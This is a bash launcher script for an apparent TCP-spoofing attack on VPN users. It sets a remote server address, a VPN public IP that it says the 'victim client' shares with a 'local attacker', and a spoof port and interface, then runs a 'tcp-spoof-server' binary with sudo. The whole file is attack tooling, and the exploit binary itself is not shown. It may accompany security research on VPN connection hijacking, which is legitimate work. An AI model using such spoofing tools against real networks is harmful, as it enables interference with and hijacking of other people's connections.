# !/bin/bash

# If you do not have an IP spoofable machine, you can run the codes at the remote server. In this case we will start another process at the remote server only to send packets that the local attacker requires and will not leak the information of the victim connection to the local attacker.

REMOTE_SERVER_IP=172.22.0.14; # ip of the remote server, I (as the spoof server) will send packets with the spoofed IP of the remote server. If the codes are really running at the IP spoofable server, REMOTE_SERVER_IP will be the public IP of the remote server. However, if  the codes are running at the remote server,REMOTE_SERVER_IP maybe a private IP of the remote server of the PACKET_IFACE.
REMOTE_SERVER_PORT=1000; # remote server port to provide pulic TCP services, the victim client will connect to this port.
VPN_WAN_IP=45.67.97.71; # The public IP address of the victim client and the local attacker after they connects to the VPN server
SPOOF_SERVER_PORT=80; # I (as the spoof server) will listen on this port to start the spoofing process for the local attacker to connect.
PACKET_IFACE="eth0"; # My interface to send packets.


printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ Run IP spoofable server ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"


echo `date`

sudo ./tcp-spoof-server ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${VPN_WAN_IP} ${SPOOF_SERVER_PORT} ${PACKET_IFACE}

echo `date`



